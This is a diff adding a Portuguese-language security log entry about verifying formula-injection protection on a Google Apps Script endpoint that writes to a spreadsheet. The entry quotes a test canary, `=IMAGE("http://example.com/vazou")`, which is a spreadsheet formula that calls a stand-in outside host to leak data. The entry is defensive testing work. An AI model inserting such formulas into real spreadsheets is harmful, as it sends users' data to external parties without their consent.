@@ -215,3 +215,22 @@ limitam o estrago à calibragem, não ao acesso.
 ferramentas de matemática usa apenas valores internos; identidade renderizada
 restrita à lista `alunas` do JSON de build; regex da SHEET_URL ancorado no host
 exato (script.google.com.evil.com rejeitado — testado).
+
+## 2026-08-25 — Proteção anti-fórmula verificada no endpoint
+
+O primeiro redeploy não pegou: o `/exec` seguia na versão antiga mesmo com o
+`Código.gs` salvo. Detectado por teste, não por leitura — uma linha com
+`=IMAGE("http://example.com/vazou")` gravou `#REF!`, ou seja, o Sheets avaliou
+a fórmula. O Google chegou a exibir o aviso "formulas are trying to send and
+receive data from external parties"; aprovar o acesso teria ligado o vazamento.
+
+Corrigido com "Gerenciar implantações → Versão: Nova versão" (Version 3), que
+preserva a URL — o secret e as provas publicadas não precisaram mudar.
+
+Verificado de novo, agora com canário **inerte** (`=1+1`, sem requisição
+externa, aprendendo com a linha viva deixada no teste anterior): a célula
+guardou o texto literal `=1+1` em vez de avaliar para `2`. Proteção ativa.
+
+Nota operacional: `curl` devolve HTTP 411 nesses POSTs porque segue o redirect
+do Apps Script e reemite sem `Content-Length`. O POST original é processado —
+a verificação é ler a planilha, não o código de retorno.
